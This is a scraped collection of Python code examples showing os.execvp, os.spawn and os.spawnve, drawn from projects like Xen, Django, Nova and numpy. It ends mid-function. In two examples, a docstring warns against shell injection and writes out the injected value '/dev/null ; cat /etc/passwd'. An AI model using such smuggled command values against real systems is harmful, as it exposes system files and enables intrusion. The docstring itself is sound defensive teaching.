#摘自 http://www.programcreek.com/python/index/1/os

#Python os.execvp Examples
{
  Python os.execvp Examples

The following are 23 code examples for showing how to use os.execvp. They are extracted from open source Python projects. You can click  vote to vote up the examples you like, or click  vote to vote down the exmaples you don't like. Your votes will be used in our system to extract more high-quality examples.
You may also check out all available functions/classes of the module os	, or try the search function   .

Example 1
From project xen, under directory tools/xm-test/lib/XmTestLib, in source file Console.py.
Score: 13
vote
vote
def __init__(self, domain, historyLimit=256, historySaveAll=True, historySaveCmds=False, cLimit=131072):
        """
        Parameters:
          historyLimit:     specifies how many lines of history are maintained
          historySaveAll:   determines whether or not extra messages in
                            between commands are saved
          historySaveCmds : determines whether or not the command echos
                            are included in the history buffer
        """

        self.TIMEOUT          = 30
        self.PROMPT           = "@%@%> "
        self.domain           = domain
        self.historyBuffer    = []
        self.historyLines     = 0
        self.historyLimit     = historyLimit
        self.historySaveAll   = historySaveAll
        self.historySaveCmds  = historySaveCmds
        self.debugMe          = False
        self.limit            = cLimit

        consoleCmd = ["/usr/sbin/xm", "xm", "console", domain]

        if verbose:
            print "Console executing: %s" % str(consoleCmd)

        pid, fd = pty.fork()

        if pid == 0:
            os.execvp("/usr/sbin/xm", consoleCmd[1:])

        self.consolePid = pid
        self.consoleFd  = fd

        tty.setraw(self.consoleFd, termios.TCSANOW)

     
Example 2
From project rama, under directory rama, in source file actions.py.
Score: 10
vote
vote
def launch(cmd):
    args = cmd.split()
    def launcher():
        if not fork():
            execvp(args[0], args)
    return launcher
 
Example 3
From project basket-lib, under directory packages/mercurial/hgext, in source file pager.py.
Score: 10
vote
vote
def _runpager(p):
    if not hasattr(os, 'fork'):
        sys.stderr = sys.stdout = util.popen(p, 'wb')
        return
    fdin, fdout = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(fdin)
        os.dup2(fdout, sys.stdout.fileno())
        os.dup2(fdout, sys.stderr.fileno())
        os.close(fdout)
        return
    os.dup2(fdin, sys.stdin.fileno())
    os.close(fdin)
    os.close(fdout)
    try:
        os.execvp('/bin/sh', ['/bin/sh', '-c', p])
    except OSError, e:
        if e.errno == errno.ENOENT:
            # no /bin/sh, try executing the pager directly
            args = shlex.split(p)
            os.execvp(args[0], args)
        else:
            raise

 

 
Example 4
From project portable-google-app-engine-sdk, under directory lib/django/django/db/backends/postgresql, in source file client.py.
Score: 10
vote
vote
def runshell():
    args = ['psql']
    if settings.DATABASE_USER:
        args += ["-U", settings.DATABASE_USER]
    if settings.DATABASE_PASSWORD:
        args += ["-W"]
    if settings.DATABASE_HOST:
        args.extend(["-h", settings.DATABASE_HOST])
    if settings.DATABASE_PORT:
        args.extend(["-p", str(settings.DATABASE_PORT)])
    args += [settings.DATABASE_NAME]
    os.execvp('psql', args)
 
Example 5
From project portable-google-app-engine-sdk, under directory lib/django/django/db/backends/mysql, in source file client.py.
Score: 10
vote
vote
def runshell():
    args = ['']
    db = settings.DATABASE_OPTIONS.get('db', settings.DATABASE_NAME)
    user = settings.DATABASE_OPTIONS.get('user', settings.DATABASE_USER)
    passwd = settings.DATABASE_OPTIONS.get('passwd', settings.DATABASE_PASSWORD)
    host = settings.DATABASE_OPTIONS.get('host', settings.DATABASE_HOST)
    port = settings.DATABASE_OPTIONS.get('port', settings.DATABASE_PORT)
    defaults_file = settings.DATABASE_OPTIONS.get('read_default_file')
    # Seems to be no good way to set sql_mode with CLI
    
    if defaults_file:
        args += ["--defaults-file=%s" % defaults_file]
    if user:
        args += ["--user=%s" % user]
    if passwd:
        args += ["--password=%s" % passwd]
    if host:
        args += ["--host=%s" % host]
    if port:
        args += ["--port=%s" % port]
    if db:
        args += [db]

    os.execvp('mysql', args)
 
Example 6
From project portable-google-app-engine-sdk, under directory lib/django/django/db/backends/mysql_old, in source file client.py.
Score: 10
vote
vote
def runshell():
    args = ['']
    args += ["--user=%s" % settings.DATABASE_USER]
    if settings.DATABASE_PASSWORD:
        args += ["--password=%s" % settings.DATABASE_PASSWORD]
    if settings.DATABASE_HOST:
        args += ["--host=%s" % settings.DATABASE_HOST]
    if settings.DATABASE_PORT:
        args += ["--port=%s" % settings.DATABASE_PORT]
    args += [settings.DATABASE_NAME]
    os.execvp('mysql', args)
 
Example 7
From project portable-google-app-engine-sdk, under directory lib/django/django/db/backends/oracle, in source file client.py.
Score: 10
vote
vote
def runshell():
    args = ''
    args += settings.DATABASE_USER
    if settings.DATABASE_PASSWORD:
        args += "/%s" % settings.DATABASE_PASSWORD
    args += "@%s" % settings.DATABASE_NAME
    os.execvp('sqlplus', args)
 
Example 8
From project dragbox, under directory Dragbox, in source file utils.py.
Score: 10
vote
vote
def run_process(proc, args):
	""" 
	Launches a process
	
	@param proc: The name of the executable 
	@type proc: a string object. 
	
	@param args: A list of arguments to the program 
	@type args: a list object.   
	"""  
	from os import fork, execvp
	args = [proc] + args # strange but true
	pid = fork()
	if not pid:
		try:
			execvp(proc, args)
		except:
			print_error("Failed to run %s %s" % (proc, str(args)))
			raise SystemExit

 
Example 9
From project xen, under directory tools/python/xen/xm, in source file console.py.
Score: 10
vote
vote
def runVncViewer(domid, do_autopass, do_daemonize=False):
    xs = OurXenstoreConnection()
    d = '/local/domain/%d/' % domid
    vnc_port = xs.read_eventually(d + 'console/vnc-port')
    vfb_backend = xs.read_maybe(d + 'device/vfb/0/backend')
    vnc_listen = None
    vnc_password = None
    vnc_password_tmpfile = None
    cmdl = ['vncviewer']
    if vfb_backend is not None:
        vnc_listen = xs.read_maybe(vfb_backend + '/vnclisten')
        if do_autopass:
            vnc_password = xs.read_maybe(vfb_backend + '/vncpasswd')
            if vnc_password is not None:
                cmdl.append('-autopass')
                vnc_password_tmpfile = os.tmpfile()
                print >>vnc_password_tmpfile, vnc_password
                vnc_password_tmpfile.seek(0)
                vnc_password_tmpfile.flush()
    if vnc_listen is None:
        vnc_listen = 'localhost'
    cmdl.append('%s:%d' % (vnc_listen, int(vnc_port) - 5900))
    if do_daemonize:
        pid = utils.daemonize('vncviewer', cmdl, vnc_password_tmpfile)
        if pid == 0:
            print >>sys.stderr, 'failed to invoke vncviewer'
            os._exit(-1)
    else:
        print 'invoking ', ' '.join(cmdl)
        if vnc_password_tmpfile is not None:
            os.dup2(vnc_password_tmpfile.fileno(), 0)
        try:
            os.execvp('vncviewer', cmdl)
        except OSError:
            print >>sys.stderr, 'Error: external vncviewer missing or not \
in the path\nExiting'
            os._exit(-1)
 
Example 10
From project geodjango, under directory django/db/backends/oracle, in source file client.py.
Score: 10
vote
vote
def runshell():
    dsn = settings.DATABASE_USER
    if settings.DATABASE_PASSWORD:
        dsn += "/%s" % settings.DATABASE_PASSWORD
    if settings.DATABASE_NAME:
        dsn += "@%s" % settings.DATABASE_NAME
    args = ["sqlplus", "-L", dsn]
    os.execvp("sqlplus", args)
 
Example 11
From project m2crypto, under directory demo/ssl, in source file ss.py.
Score: 10
vote
vote
def main():
    pid = os.fork()
    if pid:
        time.sleep(1)
        os.kill(pid, 1)
        os.waitpid(pid, 0)
    else:
        os.execvp('openssl', ('s_server',))

 
Example 12
From project m2crypto, under directory tests, in source file test_ssl.py.
Score: 10
vote
vote
def start_server(self, args):
        if not self.openssl_in_path:
            raise Exception('openssl command not in PATH')
        
        pid = os.fork()
        if pid == 0:
            # openssl must be started in the tests directory for it
            # to find the .pem files
            os.chdir('tests')
            try:
                os.execvp('openssl', args)
            finally:
                os.chdir('..')
                
        else:
            time.sleep(sleepTime)
            return pid

     
Example 13
From project schedulator, under directory cmd, in source file view-cmd.py.
Score: 10
vote
vote
def mutt(*l):
    os.execvp('mutt',
              ['mutt',
               '-e', 'set folder="%s"' % bogdir,
               '-e', 'source "%s/muttx"' % exedir] + list(l))


 
Example 14
From project samba, under directory source3/stf, in source file comfychair.py.
Score: 10
vote
vote
def runcmd_background(self, cmd):
        import os
        self.test_log = self.test_log + "Run in background:\n" + `cmd` + "\n"
        pid = os.fork()
        if pid == 0:
            # child
            try:
                os.execvp("/bin/sh", ["/bin/sh", "-c", cmd])
            finally:
                os._exit(127)
        self.test_log = self.test_log + "pid: %d\n" % pid
        return pid


     
Example 15
From project python-ibmdb-master, under directory IBM_DB/ibm_db_django/ibm_db_django, in source file client.py.
Score: 10
vote
vote
def runshell( self ):
        if ( djangoVersion[0:2] <= ( 1, 0 ) ):
            from django.conf import settings
            database_name = settings.DATABASE_NAME
            database_user = settings.DATABASE_USER
            database_password = settings.DATABASE_PASSWORD
        elif ( djangoVersion[0:2] <= ( 1, 1 ) ):
            settings_dict = self.connection.settings_dict
            database_name = settings_dict['DATABASE_NAME']
            database_user = settings_dict['DATABASE_USER']
            database_password = settings_dict['DATABASE_PASSWORD']
        else:
            settings_dict = self.connection.settings_dict
            database_name = settings_dict['NAME']
            database_user = settings_dict['USER']
            database_password = settings_dict['PASSWORD']
            
        cmdArgs = ["db2"]
        
        if ( os.name == 'nt' ):
            cmdArgs += ["db2 connect to %s" % database_name]
        else:
            cmdArgs += ["connect to %s" % database_name]
        
        if ( isinstance( database_user, basestring ) and 
            ( database_user != '' ) ):
            cmdArgs += ["user %s" % database_user]
            
            if ( isinstance( database_password, basestring ) and 
                ( database_password != '' ) ):
                cmdArgs += ["using %s" % database_password]
                
        # db2cmd is the shell which is required to run db2 commands on windows.
        if ( os.name == 'nt' ):
            os.execvp( 'db2cmd', cmdArgs )
        else:
            os.execvp( 'db2', cmdArgs )
 
Example 16
From project nova, under directory nova/cmd, in source file baremetal_manage.py.
Score: 8
vote
vote
def main():
    """Parse options and call the appropriate class/method."""
    CONF.register_cli_opt(category_opt)
    try:
        config.parse_args(sys.argv)
        logging.setup("nova")
    except cfg.ConfigFilesNotFoundError:
        cfgfile = CONF.config_file[-1] if CONF.config_file else None
        if cfgfile and not os.access(cfgfile, os.R_OK):
            st = os.stat(cfgfile)
            print(_("Could not read %s. Re-running with sudo") % cfgfile)
            try:
                os.execvp('sudo', ['sudo', '-u', '#%s' % st.st_uid] + sys.argv)
            except Exception:
                print(_('sudo failed, continuing as if nothing happened'))

        print(_('Please re-run nova-manage as root.'))
        return(2)

    if CONF.category.name == "version":
        print(version.version_string_with_package())
        return(0)

    if CONF.category.name == "bash-completion":
        if not CONF.category.query_category:
            print(" ".join(CATEGORIES.keys()))
        elif CONF.category.query_category in CATEGORIES:
            fn = CATEGORIES[CONF.category.query_category]
            command_object = fn()
            actions = methods_of(command_object)
            print(" ".join([k for (k, v) in actions]))
        return(0)

    fn = CONF.category.action_fn
    fn_args = [arg.decode('utf-8') for arg in CONF.category.action_args]
    fn_kwargs = {}
    for k in CONF.category.action_kwargs:
        v = getattr(CONF.category, 'action_kwarg_' + k)
        if v is None:
            continue
        if isinstance(v, basestring):
            v = v.decode('utf-8')
        fn_kwargs[k] = v

    # call the action with the remaining arguments
    # check arguments
    try:
        cliutils.validate_args(fn, *fn_args, **fn_kwargs)
    except cliutils.MissingArgs as e:
        print(fn.__doc__)
        print(e)
        return(1)
    try:
        fn(*fn_args, **fn_kwargs)
        return(0)
    except Exception:
        print(_("Command failed, please check log for more info"))
        raise
 
Example 17
From project nova, under directory nova/cmd, in source file manage.py.
Score: 8
vote
vote
def main():
    """Parse options and call the appropriate class/method."""
    CONF.register_cli_opt(category_opt)
    try:
        config.parse_args(sys.argv)
        logging.setup("nova")
    except cfg.ConfigFilesNotFoundError:
        cfgfile = CONF.config_file[-1] if CONF.config_file else None
        if cfgfile and not os.access(cfgfile, os.R_OK):
            st = os.stat(cfgfile)
            print _("Could not read %s. Re-running with sudo") % cfgfile
            try:
                os.execvp('sudo', ['sudo', '-u', '#%s' % st.st_uid] + sys.argv)
            except Exception:
                print _('sudo failed, continuing as if nothing happened')

        print _('Please re-run nova-manage as root.')
        return(2)

    if CONF.category.name == "version":
        print version.version_string_with_package()
        return(0)

    if CONF.category.name == "bash-completion":
        if not CONF.category.query_category:
            print " ".join(CATEGORIES.keys())
        elif CONF.category.query_category in CATEGORIES:
            fn = CATEGORIES[CONF.category.query_category]
            command_object = fn()
            actions = methods_of(command_object)
            print " ".join([k for (k, v) in actions])
        return(0)

    fn = CONF.category.action_fn
    fn_args = [arg.decode('utf-8') for arg in CONF.category.action_args]
    fn_kwargs = {}
    for k in CONF.category.action_kwargs:
        v = getattr(CONF.category, 'action_kwarg_' + k)
        if v is None:
            continue
        if isinstance(v, basestring):
            v = v.decode('utf-8')
        fn_kwargs[k] = v

    # call the action with the remaining arguments
    # check arguments
    try:
        cliutils.validate_args(fn, *fn_args, **fn_kwargs)
    except cliutils.MissingArgs as e:
        # NOTE(mikal): this isn't the most helpful error message ever. It is
        # long, and tells you a lot of things you probably don't want to know
        # if you just got a single arg wrong.
        print fn.__doc__
        CONF.print_help()
        print e
        return(1)
    try:
        ret = fn(*fn_args, **fn_kwargs)
        rpc.cleanup()
        return(ret)
    except Exception:
        print _("Command failed, please check log for more info")
        raise
 
Example 18
From project jhbuild, under directory jhbuild/frontends, in source file gtkui.py.
Score: 8
vote
vote
def handle_error(self, module, phase, nextphase, error, altphases):
        summary = _('Error during phase %(phase)s of %(module)s') % {
            'phase': phase, 'module':module.name}
        try:
            error_message = error.args[0]
            self.message('%s: %s' % (summary, error_message))
        except:
            error_message = None
            self.message(summary)

        if not self.is_active():
            self.set_urgency_hint(True)
        self.notify.notify(summary=summary, body=error_message,
                icon=gtk.STOCK_DIALOG_ERROR, expire=5)

        self.error_label.set_markup('<b>%s</b>' % _(summary))
        self.error_resolution_model.clear()
        iter = self.error_resolution_model.append(
                ('<i>%s</i>' % _('Pick an Action'), ''))
        self.error_resolution_model.append(('', ''))
        self.error_resolution_model.append(
                (_('Rerun phase %s') % phase, phase))
        if nextphase:
            self.error_resolution_model.append(
                    (_('Ignore error and continue to %s') % nextphase, nextphase))
        else:
            self.error_resolution_model.append(
                    (_('Ignore error and continue to next module'), '_done'))
        self.error_resolution_model.append(
                (_('Give up on module'), 'fail'))
        for altphase in altphases:
            try:
                altphase_label = _(getattr(getattr(module, 'do_' + altphase), 'label'))
            except AttributeError:
                altphase_label = altphase
            self.error_resolution_model.append(
                    (_('Go to phase "%s"') % altphase_label, altphase))
        self.error_resolution_model.append(('', ''))
        self.error_resolution_model.append(
                (_('Open Terminal'), 'shell'))

        self.error_combo.set_active_iter(iter)
        self.error_hbox.set_sensitive(True)
        self.error_hbox.show_all()
        self.error_resolution = None

        while True:
            self.error_resolution = None
            while gtk.events_pending():
                gtk.main_iteration()
                if self.quit:
                    return 'fail'
            if not self.error_resolution:
                continue
            self.set_urgency_hint(False)
            if self.error_resolution == 'shell':
                # set back combobox to "Pick an action"
                self.error_combo.set_active_iter(iter)
                if os.fork() == 0:
                    cmd = ['gnome-terminal', '--working-directory', module.get_builddir(self)]
                    os.execvp('gnome-terminal', cmd)
                    sys.exit(0)
                continue
            if self.error_resolution == '_done':
                self.error_resolution = None
            # keep the error hox visible during all of this module duration
            self.error_hbox.set_sensitive(False)
            return self.error_resolution

     
Example 19
From project tg2jython, under directory jython/Lib, in source file subprocess.py.
Score: 8
vote
vote
def _execute_child(self, args, executable, preexec_fn, close_fds,
                           cwd, env, universal_newlines,
                           startupinfo, creationflags, shell,
                           p2cread, p2cwrite,
                           c2pread, c2pwrite,
                           errread, errwrite):
            """Execute program (Java version)"""

            if isinstance(args, types.StringTypes):
                args = [args]
            else:
                args = escape_args(list(args))

            if shell:
                args = shell_command + args

            if executable is not None:
                args[0] = executable

            try:
                builder = java.lang.ProcessBuilder(args)
            except java.lang.IllegalArgumentException, iae:
                raise OSError(iae.getMessage() or iae)

            if env is None:
                # This is for compatibility with the CPython implementation,
                # that ends up calling os.execvp(). So os.environ is "inherited"
                # there if env is not explicitly set.
                env = os.environ

            builder_env = builder.environment()
            builder_env.clear()
            builder_env.putAll(dict(env))

            if cwd is None:
                cwd = os.getcwd()
            elif not os.path.exists(cwd):
                raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), cwd)
            elif not os.path.isdir(cwd):
                raise OSError(errno.ENOTDIR, os.strerror(errno.ENOENT), cwd)
            builder.directory(java.io.File(cwd))

            # Let Java manage redirection of stderr to stdout (it's more
            # accurate at doing so than CouplerThreads). We redirect not
            # only when stderr is marked as STDOUT, but also when
            # c2pwrite is errwrite
            if self._stderr_is_stdout(errwrite, c2pwrite):
                builder.redirectErrorStream(True)

            try:
                self._process = builder.start()
            except java.io.IOException, ioe:
                raise OSError(ioe.getMessage() or ioe)
            self._child_created = True


         
Example 20
From project portable-google-app-engine-sdk, under directory lib/django/django/db/backends/sqlite3, in source file client.py.
Score: 5
vote
vote
def runshell():
    args = ['', settings.DATABASE_NAME]
    os.execvp('sqlite3', args)
 
Example 21
From project scrapbook, under directory diverse, in source file systemArgs.py.
Score: 5
vote
vote
def systemArgs(*args, **kwargs):
    """Executes a program, returns STDOUT as a string.

    Calls the program given as the first parameter with the
    rest of the parameters as arguments. Wait until the program
    is done, and then return a string containg the program's
    output.

    If the program path given is not absolute or relative
    (ie. 'ls' instead of './ls' or '/bin/ls'), the
    environmental PATH will be searched.

    Keyword parameters:

      joinStdErr -- if true, both STDOUT and STDERR-output will
         be joined together in result. 

      returnTuple -- if true, the return value of this function will
        be a tuple (errorcode, stdout, stderr), ie. two strings.
        Note: If joinStdErr is true, stderr in return will be None.
       
        if returnTuple is false, an exception is raised if the
        command failed (ie. returned a positive errorcode)    

      Note that all of these MUST be given as keyword arguments 
      if used, to seperate them from command arguments.

    If neither returnTuple or joinStdErr are set, STDERR is just
    passed on to the normal stderr.


    Usage:

      myDate = systemArgs('date')
      systemArgs('touch', '/tmp/filename with spaces') # ignore result
      (errorcode, result, errors) = systemArgs('/bin/ls',
                                               unthrusted_variable,
                                               '/tmp', returnTuple=1)    

      The first argument is the program you want to call. This is
      used as with os.execvp. The total argument list will be used as
      args for os.execvp, ie. you don't need to worry about arg[0].

    This function is much safer than os.system(), as you don't have
    to worry about escaping bad characters in the arguments.
    This is highly usefull when building commands from unsafe
    variables (ie. from the web).

    Example of bad os.system-calls:

      filename = '/dev/null ; cat /etc/passwd'
      os.system("/bin/cp /tmp/pupp " + filename)
                  # Will run the command after ;

      use instead:
      systemArgs('/bin/cp', '/tmp/pupp', filename)


      filename = 'Kari er kul'
      os.system("touch " + filename)
      # Will touch the files 'Kari', 'er' and 'kul'

      use instead:
      systemArgs('touch', filename)

    Other examples might include characters like |, $, ``, \, !

    None of these problem would exist with systemArgs.

    Note: This function does not in any way secure the
    variables to avoid 'dangerous' paths. If you allow a
    free filename to be added, and with the given rights,
    /etc/passwd and simular could still be available
    for malicious users."""

    joinStdErr = kwargs.get("joinStdErr")
    returnTuple = kwargs.get("returnTuple")
    raiseException = kwargs.get("raiseException")

    if(joinStdErr):
        process = popen2.Popen4(args)
        error = None # We lose this one from returnTuple
    else:
        # only capture stderr if returnTuple 
        capturestderr = returnTuple
        process = popen2.Popen3(args, capturestderr)
    result = ""
    error = ""
    while process.poll() == -1:
        result += process.fromchild.read()
        if(returnTuple and not joinStdErr):
            error += process.childerr.read()
    # Would it work to poll() again after it's polled out?        
    errorcode = process.poll()
    if(returnTuple):
        return (errorcode, result, error)
    else:
        if errorcode:
            raise ErrorcodeException, errorcode
        return result

 
Example 22
From project scrapbook, under directory forgetrc, in source file systemArgs.py.
Score: 5
vote
vote
def systemArgs(*args, **kwargs):
    """Executes a program, returns STDOUT as a string.

    Calls the program given as the first parameter with the
    rest of the parameters as arguments. Wait until the program
    is done, and then return a string containg the program's
    output.

    If the program path given is not absolute or relative
    (ie. 'ls' instead of './ls' or '/bin/ls'), the
    environmental PATH will be searched.

    Keyword parameters:

      joinStdErr -- if true, both STDOUT and STDERR-output will
         be joined together in result. 

      returnTuple -- if true, the return value of this function will
        be a tuple (errorcode, stdout, stderr), ie. two strings.
        Note: If joinStdErr is true, stderr in return will be None.
       
        if returnTuple is false, an exception is raised if the
        command failed (ie. returned a positive errorcode)    

      Note that all of these MUST be given as keyword arguments 
      if used, to seperate them from command arguments.

    If neither returnTuple or joinStdErr are set, STDERR is just
    passed on to the normal stderr.


    Usage:

      myDate = systemArgs('date')
      systemArgs('touch', '/tmp/filename with spaces') # ignore result
      (errorcode, result, errors) = systemArgs('/bin/ls',
                                               unthrusted_variable,
                                               '/tmp', returnTuple=1)    

      The first argument is the program you want to call. This is
      used as with os.execvp. The total argument list will be used as
      args for os.execvp, ie. you don't need to worry about arg[0].

    This function is much safer than os.system(), as you don't have
    to worry about escaping bad characters in the arguments.
    This is highly usefull when building commands from unsafe
    variables (ie. from the web).

    Example of bad os.system-calls:

      filename = '/dev/null ; cat /etc/passwd'
      os.system("/bin/cp /tmp/pupp " + filename)
                  # Will run the command after ;

      use instead:
      systemArgs('/bin/cp', '/tmp/pupp', filename)


      filename = 'Kari er kul'
      os.system("touch " + filename)
      # Will touch the files 'Kari', 'er' and 'kul'

      use instead:
      systemArgs('touch', filename)

    Other examples might include characters like |, $, ``, \, !

    None of these problem would exist with systemArgs.

    Note: This function does not in any way secure the
    variables to avoid 'dangerous' paths. If you allow a
    free filename to be added, and with the given rights,
    /etc/passwd and simular could still be available
    for malicious users."""

    joinStdErr = kwargs.get("joinStdErr")
    returnTuple = kwargs.get("returnTuple")
    raiseException = kwargs.get("raiseException")

    if(joinStdErr):
        process = popen2.Popen4(args)
        error = None # We lose this one from returnTuple
    else:
        # only capture stderr if returnTuple 
        capturestderr = returnTuple
        process = popen2.Popen3(args, capturestderr)
    errorcode = process.wait()
    result = process.fromchild.read()
    error = result
    if(returnTuple and not joinStdErr):
        error = process.childerr.read()
    if(returnTuple):
        return (errorcode, result, error)
    else:
        if errorcode:
            raise ErrorcodeException, (errorcode, error)
        return result

 
Example 23
From project WMCore, under directory src/python/WMCore/REST, in source file Main.py.
Score: 5
vote
vote
def main():
    # Re-exec if we don't have unbuffered i/o. This is essential to get server
    # to output its logs synchronous to its operation, such that log output does
    # not remain buffered in the python server. This is particularly important
    # when infrequently accessed server redirects output to 'rotatelogs'.
    if 'PYTHONUNBUFFERED' not in os.environ:
        os.environ['PYTHONUNBUFFERED'] = "1"
        os.execvp("python", ["python"] + sys.argv)

    opt = OptionParser(usage = __doc__)
    opt.add_option("-q", "--quiet", action="store_true", dest="quiet", default=False,
                   help="be quiet, don't print unnecessary output")
    opt.add_option("-v", "--verify", action="store_true", dest="verify", default=False,
                   help="verify daemon is running, restart if not")
    opt.add_option("-s", "--status", action="store_true", dest="status", default=False,
                   help="check if the server monitor daemon is running")
    opt.add_option("-k", "--kill", action="store_true", dest="kill", default=False,
                   help="kill any existing already running daemon")
    opt.add_option("-r", "--restart", action="store_true", dest="restart", default=False,
                   help="restart, kill any existing running daemon first")
    opt.add_option("-d", "--dir", dest="statedir", metavar="DIR", default=os.getcwd(),
                   help="server state directory (default: current working directory)")
    opt.add_option("-l", "--log", dest="logfile", metavar="DEST", default=None,
                   help="log to DEST, via pipe if DEST begins with '|', otherwise a file")
    opts, args = opt.parse_args()

    if len(args) != 1:
        print >> sys.stderr, "%s: exactly one configuration file required" % sys.argv[0]
        sys.exit(1)

    if not os.path.isfile(args[0]) or not os.access(args[0], os.R_OK):
        print >> sys.stderr, "%s: %s: invalid configuration file" % (sys.argv[0], args[0])
        sys.exit(1)

    if not opts.statedir or \
       not os.path.isdir(opts.statedir) or \
       not os.access(opts.statedir, os.W_OK):
        print >> sys.stderr, "%s: %s: invalid state directory" % (sys.argv[0], opts.statedir)
        sys.exit(1)

    # Create server object.
    cfg = loadConfigurationFile(args[0])
    app = cfg.main.application.lower()
    server = RESTDaemon(cfg, opts.statedir)

    # Now actually execute the task.
    if opts.status:
        # Show status of running daemon, including exit code matching the
        # daemon status: 0 = running, 1 = not running, 2 = not running but
        # there is a stale pid file. If silent don't print out anything
        # but still return the right exit code.
        running, pid = server.daemon_pid()
        if running:
            if not opts.quiet:
                print "%s is %sRUNNING%s, PID %d" \
                  % (app, COLOR_OK, COLOR_NORMAL, pid)
            sys.exit(0)
        elif pid != None:
            if not opts.quiet:
                print "%s is %sNOT RUNNING%s, stale PID %d" \
                  % (app, COLOR_WARN, COLOR_NORMAL, pid)
            sys.exit(2)
        else:
            if not opts.quiet:
                print "%s is %sNOT RUNNING%s" \
                  % (app, COLOR_WARN, COLOR_NORMAL)
            sys.exit(1)

    elif opts.kill:
        # Stop any previously running daemon. If quiet squelch messages,
        # except removal of stale pid file cannot be silenced.
        server.kill_daemon(silent = opts.quiet)

    else:
        # We are handling a server start, in one of many possible ways:
        # normal start, restart (= kill any previous daemon), or verify
        # (= if daemon is running leave it alone, otherwise start).

        # Convert 'verify' to 'restart' if the server isn't running.
        if opts.verify:
            opts.restart = True
            if server.daemon_pid()[0]:
                sys.exit(0)

        # If restarting, kill any previous daemon, otherwise complain if
        # there is a daemon already running here. Starting overlapping
        # daemons is not supported because pid file would be overwritten
        # and we'd lose track of the previous daemon.
        if opts.restart:
            server.kill_daemon(silent = opts.quiet)
        else:
            running, pid = server.daemon_pid()
            if running:
                print >> sys.stderr, \
                  "Refusing to start over an already running daemon, pid %d" % pid
                sys.exit(1)

        # If we are (re)starting and were given a log file option, convert
        # the logfile option to a list if it looks like a pipe request, i.e.
        # starts with "|", such as "|rotatelogs foo/bar-%Y%m%d.log".
        if opts.logfile:
            if opts.logfile.startswith("|"):
                server.logfile = re.split(r"\s+", opts.logfile[1:])
            else:
                server.logfile = opts.logfile

        # Actually start the daemon now.
        server.start_daemon()
 
 
}
#Python os.spawn Examples
{
Python os.spawn Examples

The following are 2 code examples for showing how to use os.spawn. They are extracted from open source Python projects. You can click  vote to vote up the examples you like, or click  vote to vote down the exmaples you don't like. Your votes will be used in our system to extract more high-quality examples.
You may also check out all available functions/classes of the module os	, or try the search function   .

Example 1
From project p2pwebclient, under directory distro, in source file vxargs-0.3.3.py.
Score: 10
vote
vote
def spawn(cmdline, outfn, errfn, setpgrp = False):
   """A cleverer spawn that lets you redirect stdout and stderr to
   outfn and errfn.  Returns pid of child.
   You can't do this with os.spawn, sadly.
   """
   pid = os.fork()
   if pid==0: #child
       out = open(outfn, 'w')
       os.dup2(out.fileno() ,sys.stdout.fileno())
       err = open(errfn, 'w')
       os.dup2(err.fileno(), sys.stderr.fileno())
       if setpgrp:
           os.setpgrp()
       try:
           os.execvp(cmdline[0], cmdline)
       except OSError,e:
           print >> sys.stderr, "error before execution:",e
           sys.exit(255)
   #father process
   return pid

 
Example 2
From project programming, under directory Python/temp/mlabwrap/scikits/mlabwrap, in source file awmstools.py.
Score: 10
vote
vote
def runProcess(cmd, *args):
    """Run `cmd` (which is searched for in the executable path) with `args` and
    return the exit status. 

    In general (unless you know what you're doing) use::

     runProcess('program', filename)

    rather than::

     os.system('program %s' % filename)

    because the latter will not work as expected if `filename` contains
    spaces or shell-metacharacters.

    If you need more fine-grained control look at ``os.spawn*``.
    """
    from os import spawnvp, P_WAIT
    return spawnvp(P_WAIT, cmd, (cmd,) + args)
    
        
#_ :isString
# unfortunately there is no decent way to test whether something is a string
# in python (prior to 2.3 and `basestring` that is)
 
}


#Python os.spawnve Examples
{
Python os.spawnve Examples

The following are 3 code examples for showing how to use os.spawnve. They are extracted from open source Python projects. You can click  vote to vote up the examples you like, or click  vote to vote down the exmaples you don't like. Your votes will be used in our system to extract more high-quality examples.
You may also check out all available functions/classes of the module os	, or try the search function   .

Example 1
From project numpy_svn, under directory numpy/distutils, in source file exec_command.py.
Score: 5
vote
vote
def _exec_command( command, use_shell=None, use_tee = None, **env ):
    log.debug('_exec_command(...)')

    if use_shell is None:
        use_shell = os.name=='posix'
    if use_tee is None:
        use_tee = os.name=='posix'
    using_command = 0
    if use_shell:
        # We use shell (unless use_shell==0) so that wildcards can be
        # used.
        sh = os.environ.get('SHELL','/bin/sh')
        if is_sequence(command):
            argv = [sh,'-c',' '.join(list(command))]
        else:
            argv = [sh,'-c',command]
    else:
        # On NT, DOS we avoid using command.com as it's exit status is
        # not related to the exit status of a command.
        if is_sequence(command):
            argv = command[:]
        else:
            argv = shlex.split(command)

    if hasattr(os,'spawnvpe'):
        spawn_command = os.spawnvpe
    else:
        spawn_command = os.spawnve
        argv[0] = find_executable(argv[0]) or argv[0]
        if not os.path.isfile(argv[0]):
            log.warn('Executable %s does not exist' % (argv[0]))
            if os.name in ['nt','dos']:
                # argv[0] might be internal command
                argv = [os.environ['COMSPEC'],'/C'] + argv
                using_command = 1

    # sys.__std*__ is used instead of sys.std* because environments
    # like IDLE, PyCrust, etc overwrite sys.std* commands.
    so_fileno = sys.__stdout__.fileno()
    se_fileno = sys.__stderr__.fileno()
    so_flush = sys.__stdout__.flush
    se_flush = sys.__stderr__.flush
    so_dup = os.dup(so_fileno)
    se_dup = os.dup(se_fileno)

    outfile = temp_file_name()
    fout = open(outfile,'w')
    if using_command:
        errfile = temp_file_name()
        ferr = open(errfile,'w')

    log.debug('Running %s(%s,%r,%r,os.environ)' \
              % (spawn_command.__name__,os.P_WAIT,argv[0],argv))

    argv0 = argv[0]
    if not using_command:
        argv[0] = quote_arg(argv0)

    so_flush()
    se_flush()
    os.dup2(fout.fileno(),so_fileno)
    if using_command:
        #XXX: disabled for now as it does not work from cmd under win32.
        #     Tests fail on msys
        os.dup2(ferr.fileno(),se_fileno)
    else:
        os.dup2(fout.fileno(),se_fileno)
    try:
        status = spawn_command(os.P_WAIT,argv0,argv,os.environ)
    except OSError:
        errmess = str(get_exception())
        status = 999
        sys.stderr.write('%s: %s'%(errmess,argv[0]))

    so_flush()
    se_flush()
    os.dup2(so_dup,so_fileno)
    os.dup2(se_dup,se_fileno)

    fout.close()
    fout = open_latin1(outfile,'r')
    text = fout.read()
    fout.close()
    os.remove(outfile)

    if using_command:
        ferr.close()
        ferr = open_latin1(errfile,'r')
        errmess = ferr.read()
        ferr.close()
        os.remove(errfile)
